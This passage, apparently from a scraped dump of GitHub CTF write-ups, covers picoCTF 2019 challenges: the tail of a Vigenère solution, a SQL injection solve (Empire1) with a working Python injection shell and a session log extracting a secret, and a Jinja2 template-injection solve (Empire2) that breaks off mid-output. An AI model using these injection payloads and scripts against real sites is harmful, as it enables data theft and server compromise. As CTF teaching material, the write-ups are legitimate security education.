\r\n\r\nThis is a classic [Vigenère cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher). It's easily solvable using any online decoder, such as [Cyberchef](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('SOLVECRYPTO')&input=VUZKS1hRWlFVTkI).\r\n\r\nIn order to decode the message manually, we use the following algorithm:\r\n\r\n* For each letter in the key:\r\n  * Find the row corresponding the the letter\r\n  * In the row, find the column which contains the matching ciphertext letter\r\n  * The matching plaintext letter is noted at the top of the column\r\n\r\nIn our case, the plaintext is `CRYPTOISFUN`.\r\n", "timestamp": "2025-10-21T13:36:25.606940"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Empire1.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Empire1.md", "content": "# Empire1\r\nWeb Exploitation, 400 points\r\n\r\n## Description:\r\n> Psst, Agent 513, now that you're an employee of Evil Empire Co., try to get their secrets off the company website. https://2019shell1.picoctf.com/problem/45012/ Can you first find the secret code they assigned to you?\r\n\r\n\r\n## Solution: \r\n\r\nThe attached website provides registration and login pages, which do not seem to contain any vulnerabilities.\r\n\r\nAfter registering and signing in, the service allows submitting a TODO via the following form:\r\n\r\n```html\r\n<form action=\"\" method=\"post\"\r\n  class=\"form\" role=\"form\">\r\n  <input id=\"csrf_token\" name=\"csrf_token\" type=\"hidden\" value=\"IjI0ZjFiNTQ2ZmZiY2Q0ZTkzYzBlYTE4NWZmZjg5ZWFiNmVkMGM2ZDgi.XaDrHw.j2B7AzusTP7lPFthEkrCXCp-2qM\">\r\n  <div class=\"form-group  required\"><label class=\"control-label\" for=\"item\">Todo?</label>\r\n    <input class=\"form-control\" id=\"item\" name=\"item\" required type=\"text\" value=\"\">      \r\n  </div>\r\n  <input class=\"btn btn-default\" id=\"submit\" name=\"submit\" type=\"submit\" value=\"Create\">\r\n</form>\r\n```\r\n\r\nThe result is later available on another page, for example:\r\n```html\r\n<h1 class=\"page-header\">Things You Gotta Do</h1>\r\n<ul class=\"list-unstyled\">\r\n    <div class=\"row\">\r\n        <div class=\"col-md-6\">\r\n            <div class=\"well well-sm\">\r\n                <li>\r\n                <strong>Very Urgent:</strong> Test\r\n                </li> \r\n            </div>\r\n        </div>\r\n    </div>\r\n</ul>\r\n```\r\n\r\nThe \"Very Urgent:\" prefix is automatically prepended to any text provided by the user.\r\n\r\nAfter trying different strategies, I found that the page is vulnerable to SQL injection using the following syntax:\r\n```\r\n'||(SQL)||'\r\n```\r\n\r\nFor example:\r\n```\r\n'||(select tbl_name FROM sqlite_master WHERE type='table' limit 0,1 COLLATE NOCASE)||'\r\n```\r\n\r\nUsing the following interactive shell, it is possible to test different SQL queries and see the result:\r\n\r\n```python\r\nimport re\r\nimport html\r\nimport requests\r\nfrom cmd import Cmd\r\nfrom bs4 import BeautifulSoup\r\n\r\nclass Empire1(object):\r\n    BASE_URL = \"https://2019shell1.picoctf.com/problem/45012\"\r\n    \r\n    def __init__(self):\r\n        self.session = requests.Session() \r\n        \r\n    def login(self, username, password):\r\n        text = self.post(self.BASE_URL + \"/login\", {\"username\": username, \"password\": password})\r\n        if \"Invalid username or password\" in text:\r\n            raise Exception(\"Can't login\")\r\n\r\n    def post(self, uri, data):\r\n        r = self.session.get(uri, headers = {\"Referer\": uri})\r\n        csrf = self.get_csrf_token(r.text)\r\n        d = {\"csrf_token\": csrf}\r\n        d.update(data)\r\n        r = self.session.post(uri, data = d, allow_redirects = True, headers = {\"Referer\": uri})\r\n        if r.status_code != 200:\r\n            raise Exception(\"Can't post to '{}'\".format(uri))\r\n        return r.text\r\n\r\n    def add_item(self, item):\r\n        text = self.post(self.BASE_URL + \"/add_item\", {\"item\": item})\r\n        if \"Item Added\" not in text:\r\n            raise Exception(\"Can't add item '{}'\".format(item))\r\n\r\n    def get_last_item(self):\r\n        r = self.session.get(self.BASE_URL + \"/list_items\")\r\n        parsed_html = BeautifulSoup(r.text, \"lxml\")\r\n        return parsed_html.body.find_all('div', attrs={'class':'well well-sm'})[-1].findChildren(\"li\" , recursive=False)[0].get_text().replace(\"Very Urgent: \", \"\")\r\n\r\n\r\n    def get_csrf_token(self, html):\r\n        token = re.search(r'<input id=\"csrf_token\" name=\"csrf_token\" type=\"hidden\" value=\"([^\"]+)\">', html, re.MULTILINE)\r\n        if token is None:\r\n            raise Exception(\"Can't find CSRF token\")\r\n        return token.group(1)\r\n\r\nclass MyPrompt(Cmd):\r\n    def __init__(self):\r\n        Cmd.__init__(self)\r\n        self.site = Empire1()\r\n        self.site.login(\"user\", \"password\")\r\n        print \"Logged in\"\r\n\r\n    def do_exit(self, inp):\r\n        return True\r\n \r\n    def do_send(self, param):\r\n        q = \"'||({})||'\".format(param)\r\n        self.site.add_item(q)\r\n        print self.site.get_last_item()\r\n \r\nMyPrompt().cmdloop()\r\n```\r\n\r\nThe script assumes that we've already registered with the `user:password` credentials. It also requires prepending the command `send` to each SQL command, in order to trigger `do_send`.\r\n\r\nThe DB used for this website is SQLite. We first leak the tables and table structure using `sqlite_master`, then we search for the flag within the DB.\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Empire1# python shell.py\r\nLogged in\r\n(Cmd) send select tbl_name FROM sqlite_master WHERE type='table' limit 0,1 COLLATE NOCASE\r\n\r\nuser\r\n\r\n(Cmd) send select tbl_name FROM sqlite_master WHERE type='table' limit 1,1 COLLATE NOCASE\r\n\r\ntodo\r\n\r\n(Cmd) send select tbl_name FROM sqlite_master WHERE type='table' limit 2,1 COLLATE NOCASE\r\n\r\nNone\r\n\r\n(Cmd) send select sql FROM sqlite_master WHERE type='table' limit 0,1 COLLATE NOCASE\r\n\r\nCREATE TABLE user (\r\n        id INTEGER NOT NULL,\r\n        username VARCHAR(64),\r\n        name VARCHAR(128),\r\n        password_hash VARCHAR(128),\r\n        secret VARCHAR(128),\r\n        admin INTEGER,\r\n        PRIMARY KEY (id)\r\n)\r\n\r\n(Cmd) send select sql FROM sqlite_master WHERE type='table' limit 1,1 COLLATE NOCASE\r\n\r\nCREATE TABLE todo (\r\n        id INTEGER NOT NULL,\r\n        item VARCHAR(256),\r\n        user_id INTEGER,\r\n        PRIMARY KEY (id),\r\n        FOREIGN KEY(user_id) REFERENCES user (id)\r\n)\r\n\r\n(Cmd) send select item FROM todo where item like '%picoCTF%' limit 0,1 COLLATE NOCASE\r\n\r\nNone\r\n\r\n(Cmd) send select secret FROM user where secret like '%picoCTF%' limit 0,1 COLLATE NOCASE\r\n\r\npicoCTF{wh00t_it_a_sql_injecta60643ae}\r\n\r\n(Cmd) exit\r\n```\r\n\r\n", "timestamp": "2025-10-21T13:36:25.697899"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Empire2.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Empire2.md", "content": "# Empire2\r\nWeb Exploitation, 450 points\r\n\r\n## Description:\r\n> Well done, Agent 513! Our sources say Evil Empire Co is passing secrets around when you log in: https://2019shell1.picoctf.com/problem/13253/, can you help us find it?\r\n\r\n\r\n## Solution: \r\n\r\nThis is the follow-up for [Empire1](Empire1.md). The website interface is the same, but the SQL injection vulnerability that worked last time is blocked now.\r\n\r\nInstead, we have a Flask template injection vulnerability: (Some) Python code entered between double curly brackets is executed, and the output contains the response instead of the raw expression.\r\n\r\nFor example, we can enter:\r\n```\r\n{{4*4}}\r\n```\r\n\r\nAnd as a response, see:\r\n```\r\nVery Urgent: 16 \r\n```\r\n\r\nWe'll use a slightly modified version of Empire1's shell utility to explore this challenge:\r\n\r\n```python\r\nimport re\r\nimport html\r\nimport requests\r\nfrom cmd import Cmd\r\nfrom bs4 import BeautifulSoup\r\n\r\nclass Empire2(object):\r\n    BASE_URL = \"https://2019shell1.picoctf.com/problem/13253\"\r\n    \r\n    def __init__(self):\r\n        self.session = requests.Session() \r\n        \r\n    def login(self, username, password):\r\n        text = self.post(self.BASE_URL + \"/login\", {\"username\": username, \"password\": password})\r\n        if \"Invalid username or password\" in text:\r\n            raise Exception(\"Can't login\")\r\n\r\n    def post(self, uri, data):\r\n        r = self.session.get(uri, headers = {\"Referer\": uri})\r\n        csrf = self.get_csrf_token(r.text)\r\n        d = {\"csrf_token\": csrf}\r\n        d.update(data)\r\n        r = self.session.post(uri, data = d, allow_redirects = True, headers = {\"Referer\": uri})\r\n        if r.status_code != 200:\r\n            raise Exception(\"Can't post to '{}'\".format(uri))\r\n        return r.text\r\n\r\n    def add_item(self, item):\r\n        text = self.post(self.BASE_URL + \"/add_item\", {\"item\": item})\r\n        if \"Item Added\" not in text:\r\n            raise Exception(\"Can't add item '{}'\".format(item))\r\n\r\n    def get_last_item(self):\r\n        r = self.session.get(self.BASE_URL + \"/list_items\")\r\n\r\n        # Due to a bug in the website, there is an incorrect \"</body>\" tag in the middle of the source code.\r\n        # This causes BeautifulSoup to fail, so we just remote it\r\n        html = r.text.replace(\"</body>\", \"\", 1) \r\n\r\n        parsed_html = BeautifulSoup(html, \"lxml\")\r\n        return parsed_html.body.find_all('div', attrs={'class':'well well-sm'})[-1].findChildren(\"li\" , recursive=False)[0].get_text().replace(\"Very Urgent: \", \"\")\r\n\r\n\r\n    def get_csrf_token(self, html):\r\n        token = re.search(r'<input id=\"csrf_token\" name=\"csrf_token\" type=\"hidden\" value=\"([^\"]+)\">', html, re.MULTILINE)\r\n        if token is None:\r\n            raise Exception(\"Can't find CSRF token\")\r\n        return token.group(1)\r\n\r\nclass MyPrompt(Cmd):\r\n    def __init__(self):\r\n        Cmd.__init__(self)\r\n        self.site = Empire2()\r\n        self.site.login(\"user\", \"password\")\r\n        print \"Logged in\"\r\n\r\n    def do_exit(self, inp):\r\n        return True\r\n \r\n    def do_send(self, param):\r\n        # Literal curly brackets are escaped by another set of curly brackets\r\n        q = \"{{{{{}}}}}\".format(param) \r\n        print \"Sending: '{}'\".format(q)\r\n        self.site.add_item(q)\r\n        print self.site.get_last_item()\r\n \r\nMyPrompt().cmdloop()\r\n```\r\n\r\nSince direct access to the Python built-ins is blocked, we'll build our way up using the same technique that worked in last year's [Flaskcards](/2018_picoCTF/Flaskcards.md).\r\n\r\nSession:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Empire2# python shell.py\r\nLogged in\r\n(Cmd) send 4*4\r\nSending: '{{4*4}}'\r\n\r\n16\r\n\r\n(Cmd) send ''.__class__\r\nSending: '{{''.__class__}}'\r\n\r\n<class 'str'>\r\n\r\n(Cmd) send ''.__class__.mro()\r\nSending: '{{''.__class__.mro()}}'\r\n\r\n[<class 'str'>, <class 'object'>]\r\n\r\n(Cmd) send ''.__class__.mro()[1]\r\nSending: '{{''.__class__.mro()[1]}}'\r\n\r\n<class 'object'>\r\n\r\n(Cmd) send ''.__class__.mro()[1].__subclasses__()\r\nSending: '{{''.__class__.mro()[1].__subclasses__()}}'\r\n\r\n[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class 'moduledef'>, <class 'module'>, <class 'BaseException'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib._installed_safely'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class 'zipimport.zipimporter'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_itemiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'operator.itemgetter'>, <class 'operator.attrgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class 'collections._Link'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'functools.partialmethod'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.Loader'>, <class 'contextlib.ContextDecorator'>, <class 'uwsgi._Input'>, <class 'uwsgi.SymbolsImporter'>, <class 'uwsgi.ZipImporter'>, <class 'uwsgi.SymbolsZipImporter'>, <class '_ast.AST'>, <class 'enum.auto'>, <enum 'Enum'>, <class '_sre.SRE_Pattern'>, <class '_sre.SRE_Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.Pattern'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'tokenize.Untokenizer'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'Struct'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class '_pickle.Unpickler'>, <class '_pickle.Pickler'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class '_hashlib.HASH'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class '_sha3.sha3_224'>, <class '_sha3.sha3_256'>, <class '_sha3.sha3_384'>, <class '_sha3.sha3_512'>, <class '_sha3.shake_128'>, <class '_sha3.shake_256'>, <class '_random.Random'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContextBase'>, <class 'jinja2.runtime.LoopContextIterator'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'numbers.Number'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class '__future__._Feature'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.SpooledTemporaryFile'>, <class 'tempfile.TemporaryDirectory'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'concurrent.futures._base._Waiter'>, <class 'concurrent.futures._base._AcquireFutures'>, <class 'concurrent.futures._base.Future'>, <class 'concurrent.futures._base.Executor'>, <class 'queue.Queue'>, <class 'multiprocessing.process.BaseProcess'>, <class '_socket.socket'>, <class 'array.array'>, <class 'multiprocessing.reduction._C'>, <class 'multiprocessing.reduction.AbstractReducer'>, <class 'multiprocessing.context.BaseContext'>, <class '_multiprocessing.SemLock'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'multiprocessing.util.Finalize'>, <class 'multiprocessing.util.ForkAwareThreadLock'>, <class 'multiprocessing.connection._ConnectionBase'>, <class 'multiprocessing.connection.Listener'>, <class 'multiprocessing.connection.SocketListener'>, <class 'multiprocessing.connection.ConnectionWrapper'>, <class 'concurrent.futures.process._ExceptionWithTraceback'>, <class 'concurrent.futures.process._WorkItem'>, <class 'concurrent.futures.process._ResultItem'>, <class 'concurrent.futures.process._CallItem'>, <class 'concurrent.futures.thread._WorkItem'>, <class 'ast.NodeVisitor'>, <class 'dis.Bytecode'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'asyncio.events.Handle'>, <class 'asyncio.events.AbstractServer'>, <class 'asyncio.events.AbstractEventLoop'>, <class 'asyncio.events.AbstractEventLoopPolicy'>, <class 'asyncio.coroutines.CoroWrapper'>, <class 'asyncio.futures._TracebackLogger'>, <class 'asyncio.futures.Future'>, <class '_asyncio.Future'>, <class '_asyncio.FutureIter'>, <class 'TaskStepMethWrapper'>, <class 'TaskWakeupMethWrapper'>, <class 'asyncio.locks._ContextManager'>, <class 'asyncio.locks._ContextManagerMixin'>, <class 'asyncio.locks.Event'>, <class 'asyncio.protocols.BaseProtocol'>, <class 'asyncio.queues.Queue'>, <class 'asyncio.streams.StreamWriter'>, <class 'asyncio.streams.StreamReader'>, <class 'asyncio.subprocess.Process'>, <class 'asyncio.transports.BaseTransport'>, <class 'ipaddress._IPAddressBase'>, <class 'ipaddress._BaseV4'>, <class 'ipaddress._IPv4Constants'>, <class 'ipaddress._BaseV6'>, <class 'ipaddress._IPv6Constants'>, <class 'textwrap.TextWrapper'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.Session'>, <class 'ssl.SSLObject'>, <class 'asyncio.sslproto._SSLPipe'>, <class 'asyncio.unix_events.AbstractChildWatcher'>, <class 'jinja2.asyncsupport.AsyncLoopContextIterator'>, <class 'datetime.date'>, <class 'datetime.timedelta'>, <class 'datetime.time'>, <class 'datetime.tzinfo'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug._internal._DictAccessorProperty'>, <class 'pkgutil.ImpImporter'>, <class 'pkgutil.ImpLoader'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 'werkzeug.exceptions.Aborter'>, <class 'werkzeug.urls.Href'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class 'email.charset.Charset'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class 'mimetypes.MimeTypes'>, <class 'gettext.NullTranslations'>, <class 'argparse._AttributeHolder'>, <class 'argparse.HelpFormatter._Section'>, <class 'argparse.HelpFormatter'>, <class 'argparse.FileType'>, <class 'argparse._ActionsContainer'>, <class 'werkzeug.serving.WSGIRequestHandler'>, <class 'werkzeug.serving._SSLContext'>, <class 'werkzeug.serving.BaseWSGIServer'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures.UpdateDictMixin'>, <class 'werkzeug.datastructures.ViewItems'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'werkzeug.wrappers.accept.AcceptMixin'>, <class 'werkzeug.wrappers.auth.AuthorizationMixin'>, <class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.wrappers.base_request.BaseRequest'>, <class 'werkzeug.wrappers.base_response.BaseResponse'>, <class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, <class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, <class 'werkzeug.wrappers.etag.ETagRequestMixin'>, <class 'werkzeug.wrappers.etag.ETagResponseMixin'>, <class 'werkzeug.useragents.UserAgentParser'>, <class 'werkzeug.useragents.UserAgent'>, <class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, <class 'werkzeug.wrappers.request.StreamOnlyMixin'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.wrappers.response.ResponseStreamMixin'>, <class 'http.cookiejar.Cookie'>, <class 'http.cookiejar.CookiePolicy'>, <class 'http.cookiejar.Absent'>, <class 'http.cookiejar.CookieJar'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'uuid.UUID'>, <class 'CArgObject'>, <class '_ctypes.CThunkObject'>, <class '_ctypes._CData'>, <class '_ctypes.CField'>, <class '_ctypes.DictRemover'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <class 'itsdangerous._json._CompactJSON'>, <class 'hmac.HMAC'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, <class 'flask._compat._DeprecatedBool'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local.LocalProxy'>, <class 'difflib.SequenceMatcher'>, <class 'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'werkzeug.routing.RuleFactory'>, <class 'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.BaseConverter'>, <class 'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.types.ParamType'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'blinker._saferef.BoundMethodWeakref'>, <class 'blinker._utilities._symbol'>, <class 'blinker._utilities.symbol'>, <class 'blinker._utilities.lazy_property'>, <class 'blinker.base.Signal'>, <class 'flask.helpers.locked_cached_property'>, <class 'flask.helpers._PackageBoundObject'>, <class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'werkzeug.wrappers.json._JSONModule'>, <class 'werkzeug.wrappers.json.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, <class 'app.config.Config'>, <class 'configparser.Interpolation'>, <class 'sqlalchemy.util._collections.ImmutableContainer'>, <class 'sqlalchemy.util._collections.Properties'>, <class 'sqlalchemy.util._collections.IdentitySet'>, <class 'sqlalchemy.util._collections.WeakSequence'>, <class 'sqlalchemy.util._collections.UniqueAppender'>, <class 'sqlalchemy.util._collections.ScopedRegistry'>, <class 'sqlalchemy.exc.DontWrapMixin'>, <class 'sqlalchemy.util.langhelpers.safe_reraise'>, <class 'sqlalchemy.util.langhelpers.PluginLoader'>, <class 'sqlalchemy.util.langhelpers.portable_instancemethod'>, <class 'sqlalchemy.util.langhelpers.memoized_property'>, <class 'sqlalchemy.util.langhelpers.group_expirable_memoized_property'>, <class 'sqlalchemy.util.langhelpers.MemoizedSlots'>, <class 'sqlalchemy.util.langhelpers.dependencies._importlater'>, <class 'sqlalchemy.util.langhelpers.dependencies'>, <class 'sqlalchemy.util.langhelpers.hybridproperty'>, <class 'sqlalchemy.util.langhelpers.hybridmethod'>, <class 'sqlalchemy.util.langhelpers.symbol'>, <class 'sqlalchemy.sql.visitors.Visitable'>, <class 'sqlalchemy.sql.visitors.ClauseVisitor'>, <class 'sqlalchemy.sql.base.Immutable'>, <class 'sqlalchemy.sql.base.DialectKWArgs'>, <class 'sqlalchemy.sql.base.Generative'>, <class 'sqlalchemy.sql.base.SchemaEventTarget'>, <class 'sqlalchemy.sql.operators.Operators'>, <class 'sqlalchemy.sql.operators.custom_op'>, <class 'sqlalchemy.sql.type_api.Emulated'>, <class 'sqlalchemy.sql.type_api.NativeForEmulated'>, <class 'sqlalchemy.sql.annotation.Annotated'>, <class 